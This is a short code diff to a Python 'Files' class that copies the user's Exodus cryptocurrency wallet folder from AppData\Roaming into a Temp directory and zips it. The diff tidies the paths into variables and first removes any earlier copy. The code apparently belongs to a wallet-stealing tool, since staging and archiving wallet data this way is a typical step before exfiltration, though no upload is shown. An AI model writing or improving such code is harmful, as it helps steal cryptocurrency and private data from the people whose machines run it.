@@ -2,6 +2,8 @@ import shutil
 import os.path 
 
 client: str = os.path.expanduser("~")
+source_dir = client + "\\AppData\\Roaming\\Exodus"
+dest_dir = client + "\\AppData\\Local\\Temp\\Exodus_backup"
 
 class Files: 
     def __init__(self) -> None:
@@ -25,8 +27,12 @@ class Files:
             bool: If we could ZIP the data needed or not.
         """
         try:
-            shutil.copytree(client + "\\AppData\\Roaming\\Exodus", client + "\\AppData\\Local\\Temp\\Exodus")
-            shutil.make_archive(client + "\\AppData\\Local\\Temp\\Exodus", "zip", client + "\\AppData\\Local\\Temp\\Exodus")
+            if os.path.exists(dest_dir):
+                shutil.rmtree(dest_dir)
+                
+            shutil.copytree(source_dir, dest_dir)
+            shutil.make_archive(dest_dir, "zip", dest_dir)
+            
             
             return True
         except:
